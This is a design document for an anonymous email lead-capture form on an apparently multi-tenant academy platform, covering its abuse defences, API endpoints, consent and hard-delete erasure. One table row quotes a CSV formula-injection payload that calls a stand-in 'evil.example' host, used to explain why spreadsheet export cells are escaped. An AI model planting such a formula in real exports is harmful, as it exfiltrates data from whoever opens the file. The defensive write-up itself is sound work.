# LEADS.md — Lead capture (O4)

A visitor to an academy's public site who is interested and not ready to make
an account leaves an email address. The academy's staff see it at
`/admin/leads`, export it, or receive it in their CRM through the
`lead.captured` webhook.

It is the **first and only anonymous WRITE** in the product. Everything else
on `/api/v1/public/{academy}` reads published data (`API.md` § The public
site), and the argument that makes that surface safe — "a stranger seeing
every field is the intended outcome" — says nothing about a stranger *putting
rows in a database*. So this feature carries its own abuse story, below, and a
second anonymous write (guest webinar registration is next) needs one of its
own rather than borrowing this one.

Code: `app/Domain/Content` (the first thing in the `Content` context),
`PublicSite\LeadController`, `Content\LeadController`,
`web/src/features/publicsite/components/LeadCaptureForm.tsx`,
`web/src/features/content/routes/LeadsRoute.tsx`.

---

## 1. Who writes, who reads

| | |
|---|---|
| **Writes** | Anybody on the internet, with no account, through the form on the academy's front page and on each course sales page |
| **Reads** | Academy staff holding `lead.view` — Admin and Super Admin |
| **Never reads** | The person the lead describes. They have no account to see it through |

A lead is academy-wide. It asked to hear from the *academy*, so an instructor
whose course page it was left on does not thereby hold somebody's address.

---

## 2. The abuse story

A per-IP rate limit is not a spam defence on its own — a botnet has as many
IPs as it wants. What stops the form being useful to abuse is several
independent layers, each cheap, none sufficient alone:

| Layer | What it stops | Where |
|---|---|---|
| **One row per address** | A script resubmitting one address a thousand times moves a counter, not the row count, and fires `LeadCaptured` once — so the academy's CRM is not flooded either | unique index on `leads.email`; `CaptureLead` uses `createOrFirst` (insert, catch the violation) |
| **The same answer whatever happened** | A new lead, an address already on the list, a filled honeypot and a form posted too fast all get `202 {"data":{"received":true}}`. "Already subscribed" would tell a stranger whose address is on an academy's list; "rejected" would tell a script which check to work around | `PublicSite\LeadController` |
| **Encrypted form token** | Posting requires fetching the form first and waiting. A token is refused by any academy but the one that issued it, expires after 24 h, and a form posted within 3 s of being served is discarded silently. Encrypted rather than signed, so the minimum wait cannot be read out of the token | `LeadFormToken`, `orbito.leads.*` |
| **Honeypot** | An off-screen `website` input, hidden from assistive technology and out of the tab order. Anything in it was put there by something filling every input it found — discarded silently | `SubmitLeadRequest::isTrap()` |
| **Three rate limits** | 5/min and 50/day per IP, and 3/hour per address per academy | the `leads` limiter, `orbito.rate_limits.leads_*` |
| **Nothing is ever sent to the address** | The form cannot be used to make an academy email a victim — the classic abuse of a signup form. There is no confirmation mail, deliberately | — (see §6, double opt-in) |
| **Formula-safe export** | A name like `=HYPERLINK("https://evil.example/?"&A2,"Open")` runs in the admin's spreadsheet when they open the CSV. Every string cell starting `=`, `+`, `-`, `@`, tab or CR is prefixed with `'` | `CsvDownload::cell()` — which the analytics exports now use too, since course titles are typed by instructors |
| **A repeat cannot rewrite a record** | The second submission of an address may be anybody typing it. It moves the count and the date, fills a name only where there was none, and never touches the consent, the source or the status | `CaptureLead` |

**What is deliberately NOT stored:** an IP address, hashed or otherwise. Its
only use would be abuse, which the limiter answers in cache and then forgets.
A column would be personal data kept for nothing.

**The source page is the server's answer, not the client's.** The form sends
`source` and a slug; the request resolves it with the same scopes the public
pages read with (`Course::live()`, `Webinar::published()`), so a lead cannot
be attributed to a draft or a private course, and the title stored is the
database's.

---

## 3. Endpoints

### The stranger's side — `/api/v1/public/{academy}` (`tenant.public`)

**`GET lead-form`** → `200`, `Cache-Control: no-store`

```json
{ "data": { "token": "eyJpdiI6…", "consent_text": "I agree to Dhaka Art School contacting me by email about its courses and events. I can ask for my details to be deleted at any time." } }
```

**`POST leads`** — `throttle:leads`

| Field | Rules |
|---|---|
| `email` | required, RFC email (no DNS lookup — that would make our servers wait on somebody else's resolver), ≤ 254 |
| `name` | optional, ≤ 120 |
| `consent` | must be accepted |
| `source` | `site` \| `course` \| `webinar` |
| `source_slug` | required unless `source` is `site`; must name a live course / published webinar |
| `form_token` | from `GET lead-form` |
| `website` | the honeypot — leave empty |

→ `202 {"data":{"received":true}}` for every accepted submission, stored or
not. `422 validation_failed` for a bad field; a stale or foreign token is a
422 on `form_token`, which the form answers by fetching a fresh one. `404` for
an unknown or closed academy — the same 404 as the rest of the public site.

### The academy's side — `/api/v1/admin` (`auth:sanctum`, `tenant`)

| Method | Path | Permission | Notes |
|---|---|---|---|
| `GET` | `leads?status=&q=&page=` | `lead.view` | Newest activity first (`last_submitted_at`, then `id`). `meta.can_manage` and `meta.can_export` say what the reader may do |
| `GET` | `leads/export?status=&q=` | `lead.export` | CSV, streamed, the same filters as the list. `throttle:10,1` |
| `PATCH` | `leads/{uuid}` | `lead.manage` | `{"status": "new" \| "contacted" \| "archived"}`. Behind `subscription` |
| `DELETE` | `leads/{uuid}` | `lead.manage` | **Hard** delete. NOT behind `subscription` — see §4 |

A lead:

```json
{
  "id": "0192…", "email": "ada@example.test", "name": "Ada Lovelace",
  "status": "new", "status_label": "New",
  "source": "course", "source_label": "Course page", "source_title": "Watercolour for beginners",
  "consent_text": "I agree to …", "consented_at": "2026-09-17T10:00:00+00:00",
  "submissions_count": 2,
  "first_submitted_at": "2026-09-17T10:00:00+00:00", "last_submitted_at": "2026-09-18T08:12:00+00:00"
}
```

---

## 4. Consent and erasure

- **The wording is the server's** (`LeadConsent`, `orbito.leads.consent`). The
  form renders it and each lead stores a **copy** of the words it was shown,
  with the time. Rewording the form later does not rewrite what somebody
  agreed to — the `title_snapshot` rule.
- **A repeat keeps the first consent.** It is the one that justified holding
  the address, and the repeat may not be the address's owner.
- **Erasure is a hard delete.** A soft-deleted row is a copy of the data
  somebody asked to be rid of, and nothing refers to a lead that would need it
  kept. It sits **outside the subscription gate**: "delete my details" has to
  be honoured whether or not the academy has paid this month, the same way a
  lapsed academy still reads and exports everything.
- What already left through a `lead.captured` webhook is the receiving
  system's to erase. The delete dialog says so.

---

## 5. Integrations

`lead.captured` (`WEBHOOKS.md` §6) fires for a **new** address only. Its data:

```json
{ "lead": { "id", "email", "name", "source", "source_title", "consent_text", "consented_at", "captured_at" } }
```

The consent wording travels with the address, so the receiving system holds
the record of what was agreed to.

---

## 6. Known limits, deliberately left

- **No CAPTCHA provider.** The layers above are what exist. If an academy is
  targeted anyway, a Turnstile/hCaptcha check is one more rule in
  `SubmitLeadRequest::after()` and a widget in the form — and it is a third
  party seeing every visitor, which is a decision, not a default.
- **No double opt-in.** Confirming ownership means emailing the address, and
  emailing an address a stranger typed is exactly the abuse §2 refuses. So a
  lead means "somebody typed this address and ticked the box", and a first
  contact should be written for that. Double opt-in, if it comes, needs its own
  rate story for the outbound mail.
- **Staff are not notified.** A notification per lead turns a flood into every
  admin's bell; the right shape is a daily digest, which is its own slice.
- **A lead is not linked to the account it later becomes.** `users` is central
  and `leads` is per academy (§ Multi-tenancy); a listener on
  `UserRegistered` inside the academy could mark the lead converted.
- **The per-IP daily limit is shared across academies.** An open evening on
  one venue's wifi could reach 50; raise `RATE_LIMIT_LEADS_PER_DAY` for that
  host rather than for everybody.
- **A person who finishes the form in under 3 seconds is dropped silently** —
  autofill plus one click could do it. The wait counts from when the form was
  *served*, which is page load, so reading the page is usually enough.
- **`source: webinar` is accepted by the API and not yet placed** on the event
  page, which today asks the visitor to sign in to register; guest
  registration will decide what that page offers.
